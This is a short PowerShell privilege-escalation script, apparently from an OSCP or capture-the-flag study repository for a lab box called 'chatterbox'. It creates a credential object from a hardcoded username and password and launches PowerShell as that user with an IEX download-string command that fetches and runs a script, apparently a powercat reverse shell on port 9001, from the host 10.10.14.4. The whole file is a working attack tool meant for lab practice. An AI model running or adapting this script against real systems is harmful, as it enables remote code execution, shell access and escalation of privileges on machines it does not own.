<#
auth: @cyhfvg https://github.com/cyhfvg
date: 2023/03/15

execute command with user/password

ref: https://abcsup.gitbook.io/oscp-study-notes/privilege-escalation
#>

# FIX: change this {{{1
$user="ffake"
$password="p@ssw3rd135246"
$pwshCmd="IEX(New-Object Net.webClient).downloadstring('http://10.10.14.4/chatterbox/pcat.9001.ps1')"

# }}}

# create credential object
$secpasswd = ConvertTo-SecureString $password -AsPlainText -Force
$mycreds = New-Object System.Management.Automation.PSCredential ($user, $secpasswd)

# FIX: fix script url
Start-Process -FilePath "powershell" -ArgumentList $pwshCmd -Credential $mycreds
